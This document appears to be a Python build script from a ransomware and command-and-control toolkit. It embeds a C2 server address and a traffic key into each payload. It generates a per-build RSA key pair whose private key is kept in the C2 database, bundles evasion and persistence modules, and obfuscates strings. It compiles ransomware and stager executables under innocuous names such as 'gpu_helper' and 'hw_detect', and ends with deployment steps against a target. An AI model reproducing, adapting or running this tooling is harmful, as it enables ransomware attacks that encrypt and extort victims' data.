import os
import sys
import json
import shutil
import subprocess
import tempfile
import urllib.request
import sqlite3
from datetime import datetime
from Crypto.PublicKey import RSA

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tools.obfuscators.string_encrypt import obfuscate_tree

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TRAFFIC_KEY_PATH = os.path.join(PROJECT_ROOT, "server", "data", "keys", "traffic_key.key")
LIB_DIR = os.path.join(PROJECT_ROOT, "lib")
FINAL_DIR = os.path.join(PROJECT_ROOT, "dist")
DB_PATH = os.path.join(PROJECT_ROOT, "server", "data", "c2_data.db")

BUILD_NUMBER = None
PUBLIC_KEY_PEM = None

print("=== Build Script ===")

c2_server = os.environ.get("C2_SERVER", "")
if not c2_server:
    c2_server = input("Enter C2 server URL (e.g. http://192.168.1.100:4444): ").strip()
    if not c2_server:
        print("[-] C2 server URL required")
        sys.exit(1)

traffic_key = os.environ.get("TRAFFIC_KEY", "")
if not traffic_key:
    if os.path.exists(TRAFFIC_KEY_PATH):
        with open(TRAFFIC_KEY_PATH, 'rb') as f:
            traffic_key = f.read().decode().strip()
        print(f"[+] Read traffic key from {TRAFFIC_KEY_PATH}")
    else:
        print("[-] traffic_key.key not found. Start the C2 server first to generate it.")
        sys.exit(1)

print(f"[+] C2 Server: {c2_server}")
print(f"[+] Traffic key: {traffic_key[:20]}...")
os.makedirs(FINAL_DIR, exist_ok=True)


def init_build_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS build_keys (
            build_number INTEGER PRIMARY KEY AUTOINCREMENT,
            public_key TEXT NOT NULL,
            private_key TEXT NOT NULL,
            created_at TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()


def register_build_key() -> int:
    print("\n[*] Generating RSA-2048 key pair for this build...")
    rsa_key = RSA.generate(2048)
    pub_pem = rsa_key.public_key().export_key().decode()
    priv_pem = rsa_key.export_key().decode()

    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO build_keys (public_key, private_key, created_at) VALUES (?, ?, ?)",
        (pub_pem, priv_pem, datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    )
    conn.commit()
    build_number = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
    conn.close()

    print(f"[+] Build #{build_number} registered in {DB_PATH}")
    return build_number, pub_pem


def build_variant(
    source_name, src_path, output_name, hidden_imports,
    exclude_modules, target_os, lib_paths=None
):
    global BUILD_NUMBER, PUBLIC_KEY_PEM
    plat_suffix = "windows" if target_os == "Windows" else "linux"
    print(f"\n[*] Building {source_name} -> {output_name} ({target_os})...")
    build_dir = tempfile.mkdtemp(prefix=f"build_{output_name}_")
    build_src = os.path.join(build_dir, f"{source_name}.py")
    shutil.copy2(src_path, build_src)

    build_settings = os.path.join(build_dir, "settings.py")
    with open(build_settings, 'w') as f:
        f.write(f'C2_SERVER = "{c2_server}"\n')
        f.write(f'TRAFFIC_KEY = b"{traffic_key}"\n')
        f.write(f'BUILD_NUMBER = {BUILD_NUMBER}\n')
        f.write(f'PUBLIC_KEY_PEM = """{PUBLIC_KEY_PEM}"""\n')

    lib_dest = os.path.join(build_dir, "lib")
    os.makedirs(lib_dest, exist_ok=True)
    for f in ['__init__.py', 'c2_client.py', 'plugin_loader.py']:
        shutil.copy2(os.path.join(LIB_DIR, f), os.path.join(lib_dest, f))
    for base_name in ['evasion', 'persistence']:
        plat_src = os.path.join(LIB_DIR, f"{base_name}_{plat_suffix}.py")
        if os.path.exists(plat_src):
            shutil.copy2(plat_src, os.path.join(lib_dest, f"{base_name}.py"))

    print("[*] Obfuscating string literals...")
    obfuscated = obfuscate_tree(build_dir)
    print(f"    {obfuscated} files obfuscated")

    excludes = ["tkinter", "test", "unittest"]
    excludes.extend(exclude_modules)

    all_hidden = set(hidden_imports) | {
        'lib.persistence', 'lib.c2_client', 'lib.plugin_loader', 'lib.evasion',
    }
    himports = "[" + ", ".join(f"'{h}'" for h in sorted(all_hidden)) + "]"

    spec_content = (
        "# -*- mode: python ; coding: utf-8 -*-\n"
        "a = Analysis(\n"
        f"    ['{source_name}.py'],\n"
        f"    pathex=['{build_dir}'],\n"
        "    binaries=[],\n"
        "    datas=[],\n"
        f"    hiddenimports={himports},\n"
        "    hookspath=[],\n"
        "    hooksconfig={},\n"
        "    runtime_hooks=[],\n"
        f"    excludes={excludes},\n"
        "    noarchive=False,\n"
        "    optimize=2,\n"
        ")\n"
        "pyz = PYZ(a.pure)\n"
        "exe = EXE(\n"
        "    pyz,\n"
        "    a.scripts,\n"
        "    a.binaries,\n"
        "    a.datas,\n"
        "    [],\n"
        f"    name='{output_name}',\n"
        "    debug=False,\n"
        "    bootloader_ignore_signals=False,\n"
        "    strip=False,\n"
        "    upx=False,\n"
        "    upx_exclude=[],\n"
        "    runtime_tmpdir=None,\n"
        "    console=True,\n"
        "    disable_windowed_traceback=False,\n"
        "    argv_emulation=False,\n"
        "    target_arch=None,\n"
        "    codesign_identity=None,\n"
        "    entitlements_file=None,\n"
        ")\n"
    )

    spec_path = os.path.join(build_dir, f"{output_name}.spec")
    with open(spec_path, 'w') as f:
        f.write(spec_content)

    if target_os == "Linux":
        result = subprocess.run(
            ["pyinstaller", "--clean",
             "--workpath", os.path.join(build_dir, "build"),
             "--distpath", os.path.join(build_dir, "dist"),
             spec_path],
            cwd=build_dir, capture_output=True, text=True, timeout=300
        )
    else:
        if not shutil.which("docker"):
            print("[-] Docker not found.")
            print(f"    Compile manually: pyinstaller --onefile --name {output_name} '{src_path}'")
            shutil.rmtree(build_dir, ignore_errors=True)
            return False
        hi_flags = " ".join(f'--hidden-import {h}' for h in hidden_imports)
        cmd_str = (
            f"pyinstaller --clean --onefile"
            f" --name {output_name}"
            f" --paths lib {hi_flags} {source_name}.py"
        )
        result = subprocess.run(
            ["docker", "run", "--rm",
             "-v", f"{build_dir}:/src",
             "cdrx/pyinstaller-windows:latest",
             cmd_str],
            capture_output=True, text=True, timeout=600
        )

    if result.returncode != 0:
        err = result.stderr[-1500:] if len(result.stderr) > 1500 else result.stderr
        print(f"[-] Build failed:\n{err}")
        shutil.rmtree(build_dir, ignore_errors=True)
        return False

    out_dir = os.path.join(FINAL_DIR, target_os.lower())
    os.makedirs(out_dir, exist_ok=True)

    ext = ".exe" if target_os == "Windows" else ""
    src = os.path.join(build_dir, "dist", f"{output_name}{ext}")
    dst = os.path.join(out_dir, f"{output_name}{ext}")

    if os.path.exists(src):
        shutil.copy2(src, dst)
        if target_os == "Linux":
            os.chmod(dst, 0o755)
        print(f"[+] Built: {dst}")
    else:
        print(f"[-] Expected output not found: {src}")
        shutil.rmtree(build_dir, ignore_errors=True)
        return False

    shutil.rmtree(build_dir, ignore_errors=True)
    return True


def build_all_variants():
    global BUILD_NUMBER, PUBLIC_KEY_PEM

    init_build_db()
    BUILD_NUMBER, PUBLIC_KEY_PEM = register_build_key()

    variants = [
        ("installer", "ransomware", "gpu_helper",
         ['cryptography', 'lib.plugin_loader'], []),
        ("scanner", "stager", "hw_detect",
         ['cryptography', 'lib.plugin_loader'], []),
    ]

    for src_name, agent_base, out_name, himports, exmods in variants:
        if sys.platform == "win32":
            src_path = os.path.join(PROJECT_ROOT, "agents", f"{agent_base}_windows.py")
            build_variant(src_name, src_path, out_name, himports, exmods, "Windows")
        else:
            src_path_linux = os.path.join(PROJECT_ROOT, "agents", f"{agent_base}_linux.py")
            ok = build_variant(
                src_name, src_path_linux, out_name, himports, exmods, "Linux"
            )
            if ok:
                print(f"[*] Attempting {out_name} Windows cross-compile via Docker...")
                src_path_windows = os.path.join(PROJECT_ROOT, "agents", f"{agent_base}_windows.py")
                build_variant(
                    src_name, src_path_windows, out_name, himports, exmods, "Windows"
                )


build_all_variants()

print(f"\n[+] Build complete. Output in: {FINAL_DIR}")
print(f"    Build #{BUILD_NUMBER} — private key stored in server DB.")
print("    Upload hw_detect to your target first,")
print("    then use Deploy from the dashboard to deliver gpu_helper.")
